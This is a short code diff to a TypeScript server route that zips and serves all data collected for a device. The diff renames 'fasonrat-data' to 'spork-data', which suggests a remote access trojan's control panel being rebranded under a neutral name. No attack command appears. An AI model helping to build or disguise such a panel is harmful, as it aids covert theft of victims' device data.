@@ -159,7 +159,7 @@ export async function deviceRoutes(app: FastifyInstance) {
     }
     try {
       const zip = new AdmZip();
-      const folderName = `fasonrat-data-${id}`;
+      const folderName = `spork-data-${id}`;
       const deviceInfo = client.deviceInfo ? safeJsonParse(client.deviceInfo, null) : null;
       const infoPayload = {
         ...formatClient(client),
@@ -214,7 +214,7 @@ export async function deviceRoutes(app: FastifyInstance) {
       dbHelpers.addLog('DATA', 'EXPORT', `Exported all data for ${id}`, JSON.stringify({ files: allFiles.length, size: zipBuffer.length }));
       const safeId = id.replace(/[^a-zA-Z0-9_-]/g, '_');
       reply.header('Content-Type', 'application/zip');
-      reply.header('Content-Disposition', `attachment; filename="fasonrat-data-${safeId}.zip"`);
+      reply.header('Content-Disposition', `attachment; filename="spork-data-${safeId}.zip"`);
       reply.header('Content-Length', zipBuffer.length);
       return reply.send(zipBuffer);
     } catch (err: any) {
